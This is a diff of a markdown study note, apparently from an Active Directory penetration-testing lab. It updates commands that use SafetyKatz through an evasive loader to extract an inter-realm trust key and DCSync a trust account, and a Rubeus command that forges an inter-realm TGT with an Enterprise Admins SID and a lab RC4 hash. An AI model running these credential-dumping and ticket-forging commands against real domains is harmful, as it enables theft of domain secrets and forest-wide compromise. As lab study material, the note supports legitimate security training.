@@ -8,16 +8,16 @@ Ultimate goal is to extract **trust key** from `Child-DC` and forge a inter-real
 
 Extract trust key - '`mcorp$` is the trust account
 ```powershell
-.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 
-.\Loader.exe -path .\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"
 
-.\Loader.exe -path .\SafetyKatz.exe "lsadump::lsa /patch"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch"
 ```
 
 Forge inter-realm TGT
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:3332558f9d3865127606e141e90cfdda /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+.\Loader.exe -path .\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:f03c20c4974d6f6426f4f3c9b4487549 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
 ```
 
 | Option              | Description                                                 |
